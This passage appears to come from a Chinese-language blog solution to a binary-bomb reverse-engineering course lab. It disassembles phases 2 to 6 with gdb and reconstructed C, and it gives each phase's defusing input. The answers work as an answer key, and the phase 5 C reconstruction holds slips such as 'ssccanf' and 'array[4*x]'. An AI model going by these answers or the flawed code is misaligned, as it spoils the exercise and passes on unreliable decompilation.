%ebp</span><br><span class="line"> 8048ba5:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ba7:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 8048baa:	8d 45 e4             	lea    -0x1c(%ebp),%eax</span><br><span class="line"> 8048bad:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 8048bb1:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048bb4:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048bb7:	e8 b0 04 00 00       	call   804906c &lt;read_six_numbers&gt; # 读6个数字</span><br><span class="line"> 8048bbc:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp) # i=1</span><br><span class="line"> 8048bc3:	eb 1e                	jmp    8048be3 &lt;phase_2+0x3f&gt;</span><br><span class="line"> 8048bc5:	8b 45 fc             	mov    -0x4(%ebp),%eax  # a=i</span><br><span class="line"> 8048bc8:	8b 54 85 e4          	mov    -0x1c(%ebp,%eax,4),%edx # d=M[base+4*i-28] A[i-7]</span><br><span class="line"> 8048bcc:	8b 45 fc             	mov    -0x4(%ebp),%eax # a=i</span><br><span class="line"> 8048bcf:	48                   	dec    %eax # a=i-1</span><br><span class="line"> 8048bd0:	8b 44 85 e4          	mov    -0x1c(%ebp,%eax,4),%eax # a=M[base+4*(i-1)-4*7] A[i-8]</span><br><span class="line"> 8048bd4:	83 c0 05             	add    $0x5,%eax #a=a+5</span><br><span class="line"> 8048bd7:	39 c2                	cmp    %eax,%edx #cmp A[i-7]:(A[i-8]+5)</span><br><span class="line"> 8048bd9:	74 05                	je     8048be0 &lt;phase_2+0x3c&gt; #if = goto 8048be0</span><br><span class="line"> 8048bdb:	e8 e6 0a 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048be0:	ff 45 fc             	incl   -0x4(%ebp) </span><br><span class="line"> 8048be3:	83 7d fc 05          	cmpl   $0x5,-0x4(%ebp) # comp i:5</span><br><span class="line"> 8048be7:	7e dc                	jle    8048bc5 &lt;phase_2+0x21&gt; # if &lt;= goto 8048bc5</span><br><span class="line"> 8048be9:	c9                   	leave  </span><br><span class="line"> 8048bea:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>有一个<code>read_six_numbers</code>的函数，猜测会从输入中读取六个数字。阅读中间的反汇编代码，判断是比较相邻输入的差是否为 5。所以只要满足+5 的等差数列就是符合条件的正确答案。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 10 15 20 25 30</span><br></pre></td></tr></table></figure>

<h4 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048beb &lt;phase_3&gt;:</span><br><span class="line"> 8048beb:	55                   	push   %ebp</span><br><span class="line"> 8048bec:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bee:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8048bf1:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)</span><br><span class="line"> 8048bf8:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line"> 8048bfb:	89 44 24 10          	mov    %eax,0x10(%esp)</span><br><span class="line"> 8048bff:	8d 45 ef             	lea    -0x11(%ebp),%eax</span><br><span class="line"> 8048c02:	89 44 24 0c          	mov    %eax,0xc(%esp)</span><br><span class="line"> 8048c06:	8d 45 f4             	lea    -0xc(%ebp),%eax</span><br><span class="line"> 8048c09:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048c0d:	c7 44 24 04 dc 99 04 	movl   $0x80499dc,0x4(%esp)</span><br><span class="line"> 8048c14:	08 </span><br><span class="line"> 8048c15:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048c18:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048c1b:	e8 48 fc ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048c20:	89 45 f8             	mov    %eax,-0x8(%ebp)			# 返回参数值</span><br><span class="line"> 8048c23:	83 7d f8 02          	cmpl   $0x2,-0x8(%ebp) 			# cmp x:2</span><br><span class="line"> 8048c27:	7f 05                	jg     8048c2e &lt;phase_3+0x43&gt; 	# 参数大必须大于2</span><br><span class="line"> 8048c29:	e8 98 0a 00 00       	call   80496c6 &lt;explode_bomb&gt; </span><br><span class="line"> 8048c2e:	8b 45 f4             	mov    -0xc(%ebp),%eax </span><br><span class="line"> 8048c31:	89 45 dc             	mov    %eax,-0x24(%ebp)</span><br><span class="line"> 8048c34:	83 7d dc 07          	cmpl   $0x7,-0x24(%ebp) # 第一个参数必须小于7</span><br><span class="line"> 8048c38:	0f 87 c2 00 00 00    	ja     8048d00 &lt;phase_3+0x115&gt;</span><br><span class="line"> 8048c3e:	8b 55 dc             	mov    -0x24(%ebp),%edx</span><br><span class="line"> 8048c41:	8b 04 95 e8 99 04 08 	mov    0x80499e8(,%edx,4),%eax # 根据第一个参数计算跳转地址</span><br><span class="line"> 8048c48:	ff e0                	jmp    *%eax</span><br><span class="line"> 8048c4a:	c6 45 ff 74          	movb   $0x74,-0x1(%ebp) # 参数1为0跳转到这里，这里的0x74作为第2个参数对比</span><br><span class="line"> 8048c4e:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048c51:	3d 66 03 00 00       	cmp    $0x366,%eax  	# 第三个参数与0x366比较</span><br><span class="line"> 8048c56:	0f 84 ad 00 00 00    	je     8048d09 &lt;phase_3+0x11e&gt;</span><br><span class="line"> 8048c5c:	e8 65 0a 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048c61:	e9 a3 00 00 00       	jmp    8048d09 &lt;phase_3+0x11e&gt;</span><br><span class="line"> .......</span><br><span class="line"> 8048d09:	0f b6 45 ef          	movzbl -0x11(%ebp),%eax # 第2个参数与0x74比较，即116</span><br><span class="line"> 8048d0d:	38 45 ff             	cmp    %al,-0x1(%ebp)</span><br><span class="line"> 8048d10:	74 05                	je     8048d17 &lt;phase_3+0x12c&gt;</span><br><span class="line"> 8048d12:	e8 af 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d17:	c9                   	leave  </span><br><span class="line"> 8048d18:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>第16行调用了sscanf函数输入，sscanf函数的声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sscanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="comment">//str:数据源</span></span><br><span class="line"><span class="comment">//format:格式化字符串</span></span><br><span class="line"><span class="comment">//sscanf从字符串读取格式化输入，如果成功，该函数返回成功匹配和赋值的个数。    </span></span><br></pre></td></tr></table></figure>

<p>由此猜测第12行的<code>0x80499dc</code>应该是格式化字符串，作为参数传递给sscanf函数，打印该地址的字符串内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x80499dc</span><br><span class="line">0x80499dc:      &quot;%d %c %d&quot;</span><br></pre></td></tr></table></figure>

<p>可以看到要求输入3个参数，且格式为<code>&quot;%d %c %d&quot;</code>。再阅读后面的反汇编代码，可以知道第一个参数必须小于7，且程序依据第一个参数计算跳转地址，为方便起见，直接设置第一个参数为0，直接跳转到第一个判断条件；第一个判断条件比较参数3是否为<code>0x366</code>，即870；同时这里还将<code>0x74</code>保存到了栈<code>-0x1(%ebp)</code>中，是为了与参数2比较。因为参数2为char类型，使用ascii字符，116表示的字符为<code>t</code>；所以最后输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 t 870</span><br></pre></td></tr></table></figure>

<h4 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">08048d48 &lt;phase_4&gt;:</span><br><span class="line"> 8048d48:	55                   	push   %ebp</span><br><span class="line"> 8048d49:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d4b:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 8048d4e:	8d 45 f4             	lea    -0xc(%ebp),%eax</span><br><span class="line"> 8048d51:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048d55:	c7 44 24 04 08 9a 04 	movl   $0x8049a08,0x4(%esp)</span><br><span class="line"> 8048d5c:	08 </span><br><span class="line"> 8048d5d:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048d60:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d63:	e8 00 fb ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048d68:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 8048d6b:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)</span><br><span class="line"> 8048d6f:	75 07                	jne    8048d78 &lt;phase_4+0x30&gt;</span><br><span class="line"> 8048d71:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048d74:	85 c0                	test   %eax,%eax</span><br><span class="line"> 8048d76:	7f 05                	jg     8048d7d &lt;phase_4+0x35&gt;</span><br><span class="line"> 8048d78:	e8 49 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d7d:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048d80:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d83:	e8 91 ff ff ff       	call   8048d19 &lt;func4&gt;</span><br><span class="line"> 8048d88:	89 45 f8             	mov    %eax,-0x8(%ebp)</span><br><span class="line"> 8048d8b:	81 7d f8 00 5f 37 00 	cmpl   $0x375f00,-0x8(%ebp) </span><br><span class="line"> 8048d92:	74 05                	je     8048d99 &lt;phase_4+0x51&gt;</span><br><span class="line"> 8048d94:	e8 2d 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d99:	c9                   	leave  </span><br><span class="line"> 8048d9a:	c3                   	ret   </span><br></pre></td></tr></table></figure>

<p>与上一题相同，这里页使用了sscanf函数，找到格式字符串地址<code>0x8049a08</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x8049a08</span><br><span class="line">0x8049a08:      &quot;%d&quot;</span><br></pre></td></tr></table></figure>

<p>在判断了匹配参数是否大于1之后，程序在第21行调用了函数func4对输入进行计算，并将返回值与<code>0x375f00</code>比较，如果相等则返回。func4反汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">08048d19 &lt;func4&gt;:</span><br><span class="line"> 8048d19:	55                   	push   %ebp</span><br><span class="line"> 8048d1a:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d1c:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d1f:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp) 	# 比较参数x是否大于1</span><br><span class="line"> 8048d23:	7f 09                	jg     8048d2e &lt;func4+0x15&gt; </span><br><span class="line"> 8048d25:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp) 	# return 1</span><br><span class="line"> 8048d2c:	eb 15                	jmp    8048d43 &lt;func4+0x2a&gt;</span><br><span class="line"> 8048d2e:	8b 45 08             	mov    0x8(%ebp),%eax 	# Get x</span><br><span class="line"> 8048d31:	48                   	dec    %eax 			# x=x-1;</span><br><span class="line"> 8048d32:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d35:	e8 df ff ff ff       	call   8048d19 &lt;func4&gt; 	# 递归调用func4(x-1)</span><br><span class="line"> 8048d3a:	89 c2                	mov    %eax,%edx 	   	# d=func4(x-1)</span><br><span class="line"> 8048d3c:	0f af 55 08          	imul   0x8(%ebp),%edx 	# d=d*x</span><br><span class="line"> 8048d40:	89 55 fc             	mov    %edx,-0x4(%ebp)</span><br><span class="line"> 8048d43:	8b 45 fc             	mov    -0x4(%ebp),%eax 	# return x*func4(x-1)</span><br><span class="line"> 8048d46:	c9                   	leave  </span><br><span class="line"> 8048d47:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>通过分析func4的反汇编代码可知，该函数为一个递归函数，计算x!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x*func4(x<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>10!=3628800</code>，即<code>0x375f00 </code>，所以答案：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure>

<h4 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">08048d9b &lt;phase_5&gt;:</span><br><span class="line"> 8048d9b:	55                   	push   %ebp</span><br><span class="line"> 8048d9c:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d9e:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8048da1:	8d 45 e8             	lea    -0x18(%ebp),%eax  	# y in M[-0x18(%ebp)]</span><br><span class="line"> 8048da4:	89 44 24 0c          	mov    %eax,0xc(%esp)</span><br><span class="line"> 8048da8:	8d 45 ec             	lea    -0x14(%ebp),%eax 	# x in M[-0x14(%ebp)]</span><br><span class="line"> 8048dab:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048daf:	c7 44 24 04 0b 9a 04 	movl   $0x8049a0b,0x4(%esp) # format string</span><br><span class="line"> 8048db6:	08 </span><br><span class="line"> 8048db7:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048dba:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048dbd:	e8 a6 fa ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048dc2:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 8048dc5:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp) 		# 检查输入个数</span><br><span class="line"> 8048dc9:	7f 05                	jg     8048dd0 &lt;phase_5+0x35&gt;</span><br><span class="line"> 8048dcb:	e8 f6 08 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048dd0:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048dd3:	83 e0 0f             	and    $0xf,%eax </span><br><span class="line"> 8048dd6:	89 45 ec             	mov    %eax,-0x14(%ebp) 	# x=x&amp;0xf</span><br><span class="line"> 8048dd9:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048ddc:	89 45 f8             	mov    %eax,-0x8(%ebp)</span><br><span class="line"> 8048ddf:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp) 	# i=0</span><br><span class="line"> 8048de6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp) 		# sum=0</span><br><span class="line"> 8048ded:	eb 16                	jmp    8048e05 &lt;phase_5+0x6a&gt;</span><br><span class="line"> 8048def:	ff 45 f0             	incl   -0x10(%ebp) 			# i++;</span><br><span class="line"> 8048df2:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048df5:	8b 04 85 c0 a5 04 08 	mov    0x804a5c0(,%eax,4),%eax </span><br><span class="line"> 8048dfc:	89 45 ec             	mov    %eax,-0x14(%ebp) 	# x=array[x]</span><br><span class="line"> 8048dff:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048e02:	01 45 f4             	add    %eax,-0xc(%ebp) 		# sum+=x</span><br><span class="line"> 8048e05:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048e08:	83 f8 0f             	cmp    $0xf,%eax 			# cmp x:15</span><br><span class="line"> 8048e0b:	75 e2                	jne    8048def &lt;phase_5+0x54&gt; </span><br><span class="line"> 8048e0d:	83 7d f0 0c          	cmpl   $0xc,-0x10(%ebp) 	# cmp i:12</span><br><span class="line"> 8048e11:	75 08                	jne    8048e1b &lt;phase_5+0x80&gt; </span><br><span class="line"> 8048e13:	8b 45 e8             	mov    -0x18(%ebp),%eax </span><br><span class="line"> 8048e16:	39 45 f4             	cmp    %eax,-0xc(%ebp) 		# cmp sum:y</span><br><span class="line"> 8048e19:	74 05                	je     8048e20 &lt;phase_5+0x85&gt; </span><br><span class="line"> 8048e1b:	e8 a6 08 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048e20:	c9                   	leave  </span><br><span class="line"> 8048e21:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>查看输入格式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x8049a0b</span><br><span class="line">0x8049a0b:      &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>
<p>通过分析汇编代码可以知道，程序在第28行调用了数组，数组地址为<code>0x804a5c0</code>，且长度为16，因为要x的范围为<code>0&lt;=x&lt;16</code>，x要作为数组索引访问数组；这里最关键的就是打印出数组的值：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p *0x804a5c0@16</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5&#125;</span></span><br></pre></td></tr></table></figure>
<p>根据汇编代码反推出phase_5函数的源程序如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">phase_5</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    <span class="type">int</span> n = ssccanf(str,<span class="string">&quot;%d %d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        explode_bomb();</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="built_in">array</span>[] = &#123;<span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    x=x&amp;<span class="number">0xf</span>;</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0xf</span>)&#123;</span><br><span class="line">        i++;</span><br><span class="line">        x=<span class="built_in">array</span>[<span class="number">4</span>*x];</span><br><span class="line">        sum+=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">12</span>&amp;sum==y)</span><br><span class="line">    	<span class="keyword">return</span> ;</span><br><span class="line">    explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为循环只能进行12次，可以根据数组反推出x变化序列，进而得到序列和：<code>y=sum=93</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span> <span class="number">6</span> <span class="number">14</span> <span class="number">2</span> <span class="number">1</span> <span class="number">10</span> <span class="number">0</span> <span class="number">8</span> <span class="number">4</span> <span class="number">9</span> <span class="number">13</span> <span class="number">11</span> <span class="number">7</span></span><br></pre></td></tr></table></figure>

<p>答案为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 93</span><br></pre></td></tr></table></figure>

<h4 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase 6"></a>Phase 6</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">08048eb6 &lt;phase_6&gt;:</span><br><span class="line"> 8048eb6:	55                   	push   %ebp</span><br><span class="line"> 8048eb7:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048eb9:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048ebc:	c7 45 f8 6c a6 04 08 	movl   $0x804a66c,-0x8(%ebp) # 0x804a66c in M[-0x8(%ebp)]</span><br><span class="line"> 8048ec3:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048ec6:	89 04 24             	mov    %eax,(%esp)			# input_strings:str</span><br><span class="line"> 8048ec9:	e8 8a f9 ff ff       	call   8048858 &lt;atoi@plt&gt; 	# ascii to int</span><br><span class="line"> 8048ece:	89 c2                	mov    %eax,%edx 			# n1 = atoi(str)</span><br><span class="line"> 8048ed0:	8b 45 f8             	mov    -0x8(%ebp),%eax </span><br><span class="line"> 8048ed3:	89 10                	mov    %edx,(%eax) 			# n1 in 0x804a66c</span><br><span class="line"> 8048ed5:	8b 45 f8             	mov    -0x8(%ebp),%eax </span><br><span class="line"> 8048ed8:	89 04 24             	mov    %eax,(%esp) 			</span><br><span class="line"> 8048edb:	e8 42 ff ff ff       	call   8048e22 &lt;fun6&gt;</span><br><span class="line"> 8048ee0:	89 45 f8             	mov    %eax,-0x8(%ebp) 		# p=fun6(h)</span><br><span class="line"> 8048ee3:	8b 45 f8             	mov    -0x8(%ebp),%eax</span><br><span class="line"> 8048ee6:	89 45 fc             	mov    %eax,-0x4(%ebp) 		# p in M[-0x4(%ebp)]</span><br><span class="line"> 8048ee9:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp) 		# i=1</span><br><span class="line"> 8048ef0:	eb 0c                	jmp    8048efe &lt;phase_6+0x48&gt;</span><br><span class="line"> 8048ef2:	8b 45 fc             	mov    -0x4(%ebp),%eax 		</span><br><span class="line"> 8048ef5:	8b 40 08             	mov    0x8(%eax),%eax 		</span><br><span class="line"> 8048ef8:	89 45 fc             	mov    %eax,-0x4(%ebp) 		# p=p-&gt;next</span><br><span class="line"> 8048efb:	ff 45 f4             	incl   -0xc(%ebp) 			# i++;</span><br><span class="line"> 8048efe:	83 7d f4 08          	cmpl   $0x8,-0xc(%ebp) 		# cmp i:8</span><br><span class="line"> 8048f02:	7e ee                	jle    8048ef2 &lt;phase_6+0x3c&gt; </span><br><span class="line"> 8048f04:	8b 45 fc             	mov    -0x4(%ebp),%eax </span><br><span class="line"> 8048f07:	8b 10                	mov    (%eax),%edx			# get n2=p-&gt;val</span><br><span class="line"> 8048f09:	a1 6c a6 04 08       	mov    0x804a66c,%eax 		# get n1</span><br><span class="line"> 8048f0e:	39 c2                	cmp    %eax,%edx 			# cmp n2:n1</span><br><span class="line"> 8048f10:	74 05                	je     8048f17 &lt;phase_6+0x61&gt;</span><br><span class="line"> 8048f12:	e8 af 07 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048f17:	c9                   	leave  </span><br><span class="line"> 8048f18:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>phase_6一开始调用了函数atoi，该函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">atoi</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="comment">// str -- 要转换为整数的字符串。</span></span><br><span class="line"><span class="comment">// 该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。</span></span><br></pre></td></tr></table></figure>

<p>所以猜测需要输入一个可以转换为整数的字符串。运行程序并输入测试字符串<code>&quot;12345&quot;</code>，查看调用atoi函数前栈中的数据，可以看到输入字符串的地址被存放在栈顶，字符串起始地址为<code>0x804aa30</code>。在调用了atoi函数后，程序将返回值存放到了地址<code>0x804a66c</code>中，打印出来显示是刚刚输入的字符串转成的数字：</p>
